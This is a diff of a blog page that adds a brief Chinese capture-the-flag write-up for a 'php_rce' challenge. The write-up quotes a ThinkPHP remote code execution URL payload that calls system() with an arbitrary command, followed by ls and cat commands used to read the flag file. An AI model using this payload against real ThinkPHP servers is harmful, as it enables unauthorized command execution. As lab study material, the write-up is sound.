@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      0 字
+      105 字
     </span>
   
 
@@ -227,12 +227,29 @@
             <h1 style="display: none">GFSJ</h1>
             
             <div class="markdown-body">
-              
+              <h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><ul>
+<li>题目：<img src="https://ftp.bmp.ovh/imgs/2021/01/5118e8d6dae556ff.png" srcset="/img/loading.gif">          </li>
+<li>分析<br>摸索了半天，还是没有找到有价值的信息，看了别人的WP后知道原来这是Think PHP的一个远程代码执行漏洞：<blockquote>
+<p> <code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）</code>           </p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li>解<br>先<code>ls</code>一下，发现没有flag，去上级目录<code>../</code>多加几个，或者直接到根目录<code>./</code>;得到一个flag名字的文件<br><img src="https://ftp.bmp.ovh/imgs/2021/01/362902231b2d1d1d.png" srcset="/img/loading.gif"><br><code>cat ../../../flag</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/5e56a7b6934f2903.png" srcset="/img/loading.gif"></li>
+</ul>
+
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </div>
                 
               </div>
               
